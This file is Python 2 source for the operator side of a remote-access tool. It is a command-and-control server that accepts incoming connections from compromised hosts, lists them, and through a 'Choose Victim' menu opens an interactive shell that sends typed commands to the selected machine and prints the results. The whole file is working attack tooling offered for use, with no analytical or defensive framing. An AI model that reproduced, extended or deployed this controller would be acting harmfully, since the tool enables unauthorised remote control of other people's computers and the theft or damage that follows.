import socket
import threading
import os
import sys
import uuid
from cmd import *
from tabulate import tabulate


class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def run(self):
        self._enable_threading()
        Menu(self).main_menu()

    def accept_connections(self):
        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(ClientConnection(socket, addr))

    def close_connections(self):
        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):
        index = 0
        table = []
        with self.locking:
            for client in self.connections:
                if client.sync():
                    table.append((index, client.username, client.adress))
                    index += 1
                else:
                    self.connections.remove(client)
        return table

    def _enable_threading(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()

    def search_client(self, client_id):
        try:
            with self.locking:
                client = self.connections[int(client_id)]
            return client
        except IndexError:
            pass


class Shell(Cmd):

    def __init__(self, client):
        Cmd.__init__(self)
        self.client = client
        self.prompt = self.client.username+'@'+self.client.adress[0] + " $ "
        self.intro = 'Mensaje introductorio.'

    def do_clear(self, arg):
        os.system("clear")

    def do_exit(self, arg):
        return True

    def default(self, arg):
        input_command = self.command_parser(self.lastcmd)
        self.client.socket.sendall(input_command)
        received = self.client.socket.recv(4096)
        print(received)

    def command_parser(self, command):
        ret = self.parseline(command)
        command = ';'.join(list(ret)[0:2])
        return command



class ClientConnection:

    def __init__(self, socket, adress, username=None):
        self.socket = socket
        self.adress = adress
        self.username = username

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall("sync;")
        self.username = self.socket.recv(1024)
        return True if self.username else False


class Menu:

    def __init__(self, server):
        self.server = server
        self.menu_actions = {
            'main_menu': self.main_menu,
            '1': self.show_connections,
            '2': self.choose_victim,
            '9': self.back,
            '0': self.exit,
        }

    def main_menu(self):
        print "1. Show Connections"
        print "2. Choose Victim"
        print "\n0. Quit"
        choice = raw_input(">>  ")
        self.exec_menu(choice)
        return

    def exec_menu(self, choice):
        ch = choice.lower()
        if ch == '':
            self.menu_actions['main_menu']()
        else:
            try:
                self.menu_actions[ch]()
            except KeyError:
                os.system('clear')
                print "Invalid selection, please try again.\n"
                self.menu_actions['main_menu']()
        return

    def show_connections(self):
        os.system('clear')
        print "Connections !"
        table = self.server.refresh_connections()
        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
                       tablefmt='psql'))
        self.back()

    def choose_victim(self):
        print "Choose Victim !"
        choice = raw_input(">>  ")
        client = self.server.search_client(choice)
        if client:
            Shell(client).cmdloop()
        else:
            os.system('clear')
            print "Invalid selection, please try again.\n"
            self.show_connections()
        self.back()
        return

    def back(self):
        self.menu_actions['main_menu']()

    def exit(self):
        self.server.close_connections()
        sys.exit()
